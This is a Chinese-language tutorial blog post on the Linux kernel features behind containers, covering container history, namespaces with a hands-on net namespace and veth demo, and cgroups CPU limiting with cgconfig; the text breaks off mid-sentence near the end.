        <content type="html"><![CDATA[<h1 id="容器技术所涉及Linux内核关键技术"><a href="#容器技术所涉及Linux内核关键技术" class="headerlink" title="容器技术所涉及Linux内核关键技术"></a>容器技术所涉及Linux内核关键技术</h1><h1 id="一、容器技术前世今生"><a href="#一、容器技术前世今生" class="headerlink" title="一、容器技术前世今生"></a>一、容器技术前世今生</h1><h2 id="1-1-1979年-—-chroot"><a href="#1-1-1979年-—-chroot" class="headerlink" title="1.1 1979年 — chroot"></a>1.1 1979年 — chroot</h2><ul><li>容器技术的概念可以追溯到1979年的UNIX chroot。</li><li>它是一套“UNIX操作系统”系统，旨在将其root目录及其它子目录变更至文件系统内的新位置，且只接受特定进程的访问。</li><li>这项功能的设计目的在于为每个进程提供一套隔离化磁盘空间。</li><li>1982年其被添加至BSD当中。</li></ul><h2 id="1-2-2000年-—-FreeBSD-Jails"><a href="#1-2-2000年-—-FreeBSD-Jails" class="headerlink" title="1.2 2000年 — FreeBSD Jails"></a>1.2 2000年 — FreeBSD Jails</h2><ul><li>FreeBSD Jails是由Derrick T. Woolworth于2000年在FreeBSD研发协会中构建而成的早期容器技术之一。</li><li>这是一套“操作系统”系统，与chroot的定位类似，不过其中包含有其它进程沙箱机制以对文件系统、用户及网络等资源进行隔离。</li><li>通过这种方式，它能够为每个Jail、定制化软件安装包乃至配置方案等提供一个对应的IP地址。</li></ul><h2 id="1-3-2001年-—-Linux-VServer"><a href="#1-3-2001年-—-Linux-VServer" class="headerlink" title="1.3 2001年 — Linux VServer"></a>1.3 2001年 — Linux VServer</h2><ul><li>Linux VServer属于另一种jail机制，其能够被用于保护计算机系统之上各分区资源的安全(包括文件系统、CPU时间、网络地址以及内存等)。</li><li>每个分区被称为一套安全背景(security context)，而其中的虚拟化系统则被称为一套虚拟私有服务器。</li></ul><h2 id="1-4-2004年-—-Solaris容器"><a href="#1-4-2004年-—-Solaris容器" class="headerlink" title="1.4 2004年 — Solaris容器"></a>1.4 2004年 — Solaris容器</h2><ul><li>Solaris容器诞生之时面向x86与SPARC系统架构，其最初亮相于2004年2月的Solaris 10 Build 51 beta当中，随后于2005年正式登陆Solaris 10的完整版本。</li><li>Solaris容器相当于将系统资源控制与由分区提供的边界加以结合。各分区立足于单一操作系统实例之内以完全隔离的虚拟服务器形式运行。</li></ul><h2 id="1-5-2005年-—-OpenVZ"><a href="#1-5-2005年-—-OpenVZ" class="headerlink" title="1.5 2005年 — OpenVZ"></a>1.5 2005年 — OpenVZ</h2><ul><li>OpenVZ与Solaris容器非常相似，且使用安装有补丁的Linux内核以实现虚拟化、隔离能力、资源管理以及检查点交付。</li><li>每套OpenVZ容器拥有一套隔离化文件系统、用户与用户群组、一套进程树、网络、设备以及IPC对象。</li></ul><h2 id="1-6-2006年-—-Process容器"><a href="#1-6-2006年-—-Process容器" class="headerlink" title="1.6 2006年 — Process容器"></a>1.6 2006年 — Process容器</h2><ul><li>Process容器于2006年由谷歌公司推出，旨在对一整套进程集合中的资源使用量(包括CPU、内存、磁盘I/O以及网络等等)加以限制、分配与隔离。</li><li>此后其被更名为Control Groups(即控制组)，从而避免其中的“容器”字眼与Linux内核2.6.24中的另一术语出现冲突。这表明了谷歌公司率先重视容器技术的敏锐眼光以及为其做出的突出贡献。</li></ul><h2 id="1-7-2007年-—-Control-Groups"><a href="#1-7-2007年-—-Control-Groups" class="headerlink" title="1.7 2007年 — Control Groups"></a>1.7 2007年 — Control Groups</h2><p>Control Groups也就是谷歌实现的cgroups，其于2007年被添加至Linux内核当中。</p><h2 id="1-8-2008年-—-LXC"><a href="#1-8-2008年-—-LXC" class="headerlink" title="1.8 2008年 — LXC"></a>1.8 2008年 — LXC</h2><ul><li>LXC指代的是Linux Containers</li><li>是第一套完整的Linux容器管理实现方案。</li><li>其功能通过cgroups以及Linux namespaces实现。</li><li>LXC通过liblxc库进行交付，并提供可与Python3、Python2、Lua、Go、Ruby以及Haskell等语言相对接的API。</li><li>相较于其它容器技术，LXC能够在无需任何额外补丁的前提下运行在原版Linux内核之上。</li></ul><h2 id="1-9-2011年-—-Warden"><a href="#1-9-2011年-—-Warden" class="headerlink" title="1.9 2011年 — Warden"></a>1.9 2011年 — Warden</h2><ul><li>Warden由CloudFoundry公司于2011年所建立，其利用LXC作为初始阶段，随后又将其替换为自家实现方案。</li><li>与LXC不同，Warden并不会与Linux紧密耦合。相反，其能够运行在任意能够提供多种隔离环境方式的操作系统之上。Warden以后台进程方式运行并提供API以实现容器管理。</li></ul><h2 id="1-10-2013年-—-LMCTFY"><a href="#1-10-2013年-—-LMCTFY" class="headerlink" title="1.10 2013年 — LMCTFY"></a>1.10 2013年 — LMCTFY</h2><ul><li>Lmctfy代表的是“Let Me Contain That For You(帮你实现容器化)”。它其实属于谷歌容器技术堆栈的开源版本，负责提供Linux应用程序容器。谷歌公司在该项目的起步阶段宣称其能够提供值得信赖的性能表现、高资源利用率、共享资源机制、充裕的发展空间以及趋近于零的额外资源消耗。</li><li>2013年10月lmctfy的首个版本正式推出，谷歌公司在2015年决定将lmctfy的核心概念与抽象机制转化为libcontainer。在失去了主干之后，如今lmctfy已经失去一切积极的发展势头。</li></ul><p>　　Libcontainer项目最初由Docker公司建立，如今已经被归入开放容器基金会的管辖范畴。</p><h2 id="1-11-2013年-Docker"><a href="#1-11-2013年-Docker" class="headerlink" title="1.11 2013年-Docker"></a>1.11 2013年-Docker</h2><ul><li>在2013年Docker刚发布的时候，它是一款基于LXC的开源容器管理引擎。</li><li>把LXC复杂的容器创建与使用方式简化为Docker自己的一套命令体系。</li><li>随着Docker的不断发展，它开始有了更为远大的目标，那就是反向定义容器的实现标准，将底层实现都抽象化到Libcontainer的接口。这就意味着，底层容器的实现方式变成了一种可变的方案，无论是使用namespace、cgroups技术抑或是使用systemd等其他方案，只要实现了Libcontainer定义的一组接口，Docker都可以运行。这也为Docker实现全面的跨平台带来了可能。</li></ul><h1 id="二、NameSpace"><a href="#二、NameSpace" class="headerlink" title="二、NameSpace"></a>二、NameSpace</h1><h2 id="2-1-NameSpace介绍"><a href="#2-1-NameSpace介绍" class="headerlink" title="2.1 NameSpace介绍"></a>2.1 NameSpace介绍</h2><ul><li><p>很多编程语言都包含了命名空间的概念，我们可以认为命名空间是一种封装，封装本身实际上实现了代码的隔离</p></li><li><p>在操作系统中命名空间命名空间提供的是系统资源的隔离，其中系统资源包括了：进程、网络、文件系统……</p></li><li><p>实际上linux系统实现命名空间主要目的之一就是为了实现轻量级虚拟化服务，也就是我们说的容器，在同一个命名空间下的进程可以感知彼此的变化，而对其他命名空间的进程一无所知，这样就可以让容器中的进程产生一个错觉，仿佛它自己置身于一个独立的系统环境当中，以此达到独立和隔离的目的。</p></li></ul><h2 id="2-2-Linux系统中NameSpace分类"><a href="#2-2-Linux系统中NameSpace分类" class="headerlink" title="2.2 Linux系统中NameSpace分类"></a>2.2 Linux系统中NameSpace分类</h2><table><thead><tr><th align="center">命名空间</th><th align="center">描述</th><th align="center">作用</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">进程命名空间</td><td align="center">隔离进程ID</td><td align="center">Linux通过命名空间管理进程号，同一个进程，在不同的命名空间进程号不同</td><td align="center">进程命名空间是一个父子结构，子空间对于父空间可见</td></tr><tr><td align="center">网络命名空间</td><td align="center">隔离网络设备、协议栈、端口等</td><td align="center">通过网络命名空间，实现网络隔离</td><td align="center">docker采用虚拟网络设备，将不同命名空间的网络设备连接到一起</td></tr><tr><td align="center">IPC命名空间</td><td align="center">隔离进程间通信</td><td align="center">进程间交互方法</td><td align="center">PID命名空间和IPC命名空间可以组合起来用，同一个IPC名字空间内的进程可以彼此看见，允许进行交互，不同空间进程无法交互</td></tr><tr><td align="center">挂载命名空间</td><td align="center">隔离挂载点</td><td align="center">隔离文件目录</td><td align="center">进程运行时可以将挂载点与系统分离，使用这个功能时，我们可以达到 chroot 的功能，而在安全性方面比 chroot 更高</td></tr><tr><td align="center">UTS命名空间</td><td align="center">隔离Hostname和NIS域名</td><td align="center">让容器拥有独立的主机名和域名，从而让容器看起来像个独立的主机</td><td align="center">目的是独立出主机名和网络信息服务（NIS）</td></tr><tr><td align="center">用户命名空间</td><td align="center">隔离用户和group ID</td><td align="center">每个容器内上的用户跟宿主主机上不在一个命名空间</td><td align="center">同进程 ID 一样，用户 ID 和组 ID 在命名空间内外是不一样的，并且在不同命名空间内可以存在相同的 ID</td></tr></tbody></table><h2 id="2-3-NameSpace应用案例"><a href="#2-3-NameSpace应用案例" class="headerlink" title="2.3 NameSpace应用案例"></a>2.3 NameSpace应用案例</h2><blockquote><p>以net namespace为例</p></blockquote><ul><li>在 Linux 中，网络命名空间可以被认为是隔离的拥有单独网络栈（网卡、路由转发表、iptables）的环境。网络命名空间经常用来隔离网络设备和服务，只有拥有同样网络命名空间的设备，才能看到彼此。</li><li>从逻辑上说，网络命名空间是网络栈的副本，拥有自己的网络设备、路由选择表、邻接表、Netfilter表、网络套接字、网络procfs条目、网络sysfs条目和其他网络资源。</li><li>从系统的角度来看，当通过clone()系统调用创建新进程时，传递标志CLONE_NEWNET将在新进程中创建一个全新的网络命名空间。</li><li>从用户的角度来看，我们只需使用工具ip（package is iproute2）来创建一个新的持久网络命名空间。</li></ul><p><img src="%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF%E6%89%80%E6%B6%89%E5%8F%8ALinux%E5%86%85%E6%A0%B8%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF.assets/image-20220111132707215.png" alt="image-20220111132707215"></p><h3 id="2-3-1-创建net命名空间"><a href="#2-3-1-创建net命名空间" class="headerlink" title="2.3.1 创建net命名空间"></a>2.3.1 创建net命名空间</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建名称为msb的网络命名空间<span class="token comment"># ip netns add msb</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已创建的网络命名空间<span class="token comment"># ip netns ls</span>msb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-3-2-删除net命名空间"><a href="#2-3-2-删除net命名空间" class="headerlink" title="2.3.2 删除net命名空间"></a>2.3.2 删除net命名空间</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">删除已创建的网络命名空间<span class="token comment"># ip netns delete msb</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-3-在net命名空间中执行命令"><a href="#2-3-3-在net命名空间中执行命令" class="headerlink" title="2.3.3 在net命名空间中执行命令"></a>2.3.3 在net命名空间中执行命令</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在网络命名空间中执行bash命令，如果想退出，需要使用<span class="token keyword">exit</span><span class="token comment"># ip netns exec msb bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-4-在net命令空间中执行查看网络连接-网卡-命令"><a href="#2-3-4-在net命令空间中执行查看网络连接-网卡-命令" class="headerlink" title="2.3.4 在net命令空间中执行查看网络连接(网卡)命令"></a>2.3.4 在net命令空间中执行查看网络连接(网卡)命令</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在网络命名空间中查看网络命名空间中的网卡信息<span class="token comment"># ip link</span>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT <span class="token function">group</span> default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在Linux主机系统中查看<span class="token comment"># ip netns exec msb ip link list</span>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT <span class="token function">group</span> default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-5-退出当前的net命名空间"><a href="#2-3-5-退出当前的net命名空间" class="headerlink" title="2.3.5 退出当前的net命名空间"></a>2.3.5 退出当前的net命名空间</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">退出已进入的网络命名空间<span class="token comment"># exit</span><span class="token keyword">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-3-6-在net命名空间中执行多条命令"><a href="#2-3-6-在net命名空间中执行多条命令" class="headerlink" title="2.3.6 在net命名空间中执行多条命令"></a>2.3.6 在net命名空间中执行多条命令</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在网络命名空间中查看路由表<span class="token comment"># route -n</span>Kernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在网络命名空间中查看防火墙规则<span class="token comment"># iptables -t nat -nL</span>Chain PREROUTING <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>target     prot opt source               destination         Chain INPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>target     prot opt source               destination         Chain OUTPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>target     prot opt source               destination         Chain POSTROUTING <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>target     prot opt source               destination<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-7-创建虚拟网卡"><a href="#2-3-7-创建虚拟网卡" class="headerlink" title="2.3.7 创建虚拟网卡"></a>2.3.7 创建虚拟网卡</h3><blockquote><p>同时创建一对虚拟网卡</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建虚拟网卡对<span class="token comment"># ip link add veth0 type veth peer name veth1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在物理机上查看<span class="token comment"># ip a s</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>10: veth1@veth0: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST<span class="token punctuation">,</span>M-DOWN&gt; mtu 1500 qdisc noop state DOWN <span class="token function">group</span> default qlen 1000    link/ether de:44:f8:b7:12:65 brd ff:ff:ff:ff:ff:ff11: veth0@veth1: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST<span class="token punctuation">,</span>M-DOWN&gt; mtu 1500 qdisc noop state DOWN <span class="token function">group</span> default qlen 1000    link/ether 46:5e:89:8c:cb:b3 brd ff:ff:ff:ff:ff:ff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-8-迁移虚拟网卡到命名空间中"><a href="#2-3-8-迁移虚拟网卡到命名空间中" class="headerlink" title="2.3.8 迁移虚拟网卡到命名空间中"></a>2.3.8 迁移虚拟网卡到命名空间中</h3><blockquote><p>这两个网卡还都属于“default”或“global”命名空间，和物理网卡一样。把其中一个网卡转移到命名空间msb中。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">把创建的veth1网卡添加到msb网络命名空间中<span class="token comment"># ip link set veth1 netns msb</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在Linux系统命令行查看网络命名空间中的网络<span class="token comment"># ip netns exec msb ip link</span>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT <span class="token function">group</span> default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:0010: veth1@if11: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT <span class="token function">group</span> default qlen 1000    link/ether de:44:f8:b7:12:65 brd ff:ff:ff:ff:ff:ff link-netnsid 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-9-命名空间中迁出虚拟网卡"><a href="#2-3-9-命名空间中迁出虚拟网卡" class="headerlink" title="2.3.9 命名空间中迁出虚拟网卡"></a>2.3.9 命名空间中迁出虚拟网卡</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在Linux系统命令行把虚拟网卡veth1从网络命名空间删除<span class="token comment"># ip netns exec msb ip link delete veth1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在Linux系统命令行查看结果<span class="token comment"># ip netns exec msb ip link</span>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT <span class="token function">group</span> default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-10-配置虚拟网卡IP地址"><a href="#2-3-10-配置虚拟网卡IP地址" class="headerlink" title="2.3.10 配置虚拟网卡IP地址"></a>2.3.10 配置虚拟网卡IP地址</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">再次创建虚拟网卡，添加到msb网络命名空间，并设置IP地址<span class="token comment"># ip link add veth0 type veth peer name veth1</span><span class="token comment"># ip link set veth1 netns msb</span><span class="token comment"># ip netns exec msb ip addr add 192.168.50.2/24 dev veth1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在Linux系统命令行查看网络状态<span class="token comment"># ip netns exec msb ip addr</span>1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN <span class="token function">group</span> default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:0012: veth1@if13: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST&gt; mtu 1500 qdisc noop state DOWN <span class="token function">group</span> default qlen 1000    link/ether fe:20:<span class="token function">ac</span>:a8:13:4c brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>2/24 scope global veth1       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">启动虚拟网卡<span class="token punctuation">,</span>veth1与lo全部要启动<span class="token comment"># ip netns exec msb ip link set veth1 up</span><span class="token comment"># ip netns exec msb ip link set lo up</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">为物理机veth0添加IP地址<span class="token comment"># ip a s</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>15: veth0@if14: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST&gt; mtu 1500 qdisc noop state DOWN <span class="token function">group</span> default qlen 1000    link/ether 2e:b4:40:c8:73:dc brd ff:ff:ff:ff:ff:ff link-netnsid 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ip addr add 192.168.50.3/24 dev veth0</span><span class="token comment"># ip a s veth0</span>15: veth0@if14: &lt;BROADCAST<span class="token punctuation">,</span>MULTICAST&gt; mtu 1500 qdisc noop state DOWN <span class="token function">group</span> default qlen 1000    link/ether 2e:b4:40:c8:73:dc brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>3/24 scope global veth0       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ip link set veth0 up</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在宿主机上ping msb中的veth1<span class="token comment"># ping 192.168.50.2</span>PING 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>2 <span class="token punctuation">(</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>2<span class="token punctuation">)</span> 56<span class="token punctuation">(</span>84<span class="token punctuation">)</span> bytes of <span class="token keyword">data</span><span class="token punctuation">.</span>64 bytes <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>2: icmp_seq=1 ttl=64 time=0<span class="token punctuation">.</span>102 ms64 bytes <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>2: icmp_seq=2 ttl=64 time=0<span class="token punctuation">.</span>068 ms64 bytes <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>2: icmp_seq=3 ttl=64 time=0<span class="token punctuation">.</span>068 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在msb中的veth1 ping 宿主机上veth0<span class="token comment"># ip netns exec msb ping 192.168.50.3</span>PING 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>3 <span class="token punctuation">(</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>3<span class="token punctuation">)</span> 56<span class="token punctuation">(</span>84<span class="token punctuation">)</span> bytes of <span class="token keyword">data</span><span class="token punctuation">.</span>64 bytes <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>3: icmp_seq=1 ttl=64 time=0<span class="token punctuation">.</span>053 ms64 bytes <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>3: icmp_seq=2 ttl=64 time=0<span class="token punctuation">.</span>031 ms64 bytes <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>50<span class="token punctuation">.</span>3: icmp_seq=3 ttl=64 time=0<span class="token punctuation">.</span>029 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">如果需要访问本机的其它网段，可手动添加如下默认路由条目。<span class="token comment"># ip netns exec msb ip route add default via 192.168.50.3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>关于如何ping通外网主机，可设置路由转发完成。</p></blockquote><h1 id="三、CGroups"><a href="#三、CGroups" class="headerlink" title="三、CGroups"></a>三、CGroups</h1><h2 id="3-1-CGroups介绍"><a href="#3-1-CGroups介绍" class="headerlink" title="3.1 CGroups介绍"></a>3.1 CGroups介绍</h2><ul><li><p>Control groups(cgroups) 控制组</p></li><li><p>linux内核提供的可以限制、记录、隔离进程组所使用的物理资源的机制。为容器而生，没有cgroups就没有今天的容器技术。</p></li></ul><p><img src="%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF%E6%89%80%E6%B6%89%E5%8F%8ALinux%E5%86%85%E6%A0%B8%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF.assets/image-20220112182824405.png" alt="image-20220112182824405"></p><h2 id="3-2-CGroups功能"><a href="#3-2-CGroups功能" class="headerlink" title="3.2 CGroups功能"></a>3.2 CGroups功能</h2><ul><li>资源限制（Resource Limitation）：cgroups 可以对进程组使用的资源总额进行限制。如设定应用运行时使用内存的上限，一旦超过这个配额就发出 OOM（Out of Memory）。</li><li>优先级分配（Prioritization）：通过分配的 CPU 时间片数量及硬盘 IO 带宽大小，实际上就相当于控制了进程运行的优先级。</li><li>资源统计（Accounting）： cgroups 可以统计系统的资源使用量，如 CPU 使用时长、内存用量等等，这个功能非常适用于计费。</li><li>进程控制（Control）：cgroups 可以对进程组执行挂起、恢复等操作。</li></ul><h2 id="3-3-CGroups应用案例"><a href="#3-3-CGroups应用案例" class="headerlink" title="3.3 CGroups应用案例"></a>3.3 CGroups应用案例</h2><h3 id="3-3-1-安装及开启服务"><a href="#3-3-1-安装及开启服务" class="headerlink" title="3.3.1 安装及开启服务"></a>3.3.1 安装及开启服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># yum -y install libcgroup</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl start cgconfig.service </span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl enable cgconfig.service</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-3-2-限制进程使用CPU"><a href="#3-3-2-限制进程使用CPU" class="headerlink" title="3.3.2 限制进程使用CPU"></a>3.3.2 限制进程使用CPU</h3><h4 id="3-3-2-1-查看cpu-shares"><a href="#3-3-2-1-查看cpu-shares" class="headerlink" title="3.3.2.1 查看cpu shares"></a>3.3.2.1 查看cpu shares</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看资源限制子系统<span class="token namespace">[root@localhost ~]</span><span class="token comment"># lssubsys</span>cpusetcpu<span class="token punctuation">,</span>cpuacctmemorydevicesfreezernet_cls<span class="token punctuation">,</span>net_prioblkioperf_eventhugetlbpids查看子系统配置文件所在位置<span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls /sys/fs/cgroup/</span>blkio  cpuacct      cpuset   freezer  memory   net_cls<span class="token punctuation">,</span>net_prio  perf_event  systemdcpu    cpu<span class="token punctuation">,</span>cpuacct  devices  hugetlb  net_cls  net_prio          pids<span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls /sys/fs/cgroup/cpu</span>cgroup<span class="token punctuation">.</span>clone_children  cpuacct<span class="token punctuation">.</span>stat          cpu<span class="token punctuation">.</span>cfs_quota_us   cpu<span class="token punctuation">.</span>statcgroup<span class="token punctuation">.</span>event_control   cpuacct<span class="token punctuation">.</span>usage         cpu<span class="token punctuation">.</span>rt_period_us   notify_on_releasecgroup<span class="token punctuation">.</span>procs           cpuacct<span class="token punctuation">.</span>usage_percpu  cpu<span class="token punctuation">.</span>rt_runtime_us  release_agentcgroup<span class="token punctuation">.</span>sane_behavior   cpu<span class="token punctuation">.</span>cfs_period_us     cpu<span class="token punctuation">.</span>shares         tasks查看CPU时间分片，用于保证分组所得到的CPU分片总量。<span class="token namespace">[root@localhost ~]</span><span class="token comment"># cat /sys/fs/cgroup/cpu/cpu.shares</span>1024<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-3-2-2-使用CPU子系统创建2个group分组"><a href="#3-3-2-2-使用CPU子系统创建2个group分组" class="headerlink" title="3.3.2.2 使用CPU子系统创建2个group分组"></a>3.3.2.2 使用CPU子系统创建2个group分组</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># vim /etc/cgconfig.conf</span>group lesscpu <span class="token punctuation">{</span>cpu<span class="token punctuation">{</span><span class="token assign-left variable">cpu.shares</span><span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>group morecpu <span class="token punctuation">{</span>cpu<span class="token punctuation">{</span><span class="token assign-left variable">cpu.shares</span><span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># systemctl restart cgconfig</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>准备一个脚本</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#!/bin/bash</span>a=1<span class="token keyword">while</span> true<span class="token keyword">do</span>        a=$<span class="token punctuation">[</span><span class="token variable">$a</span><span class="token operator">+</span>1<span class="token punctuation">]</span>done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将将要运行的应用程序分配到指定分组(<strong>请使用单CPU机器,三个终端验证</strong>)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">终端1<span class="token comment"># cgexec -g cpu:lesscpu sh /tmp/1.sh</span>终端2<span class="token comment"># cgexec -g cpu:morecpu sh /tmp/1.sh</span>终端3<span class="token comment"># top</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>PS: 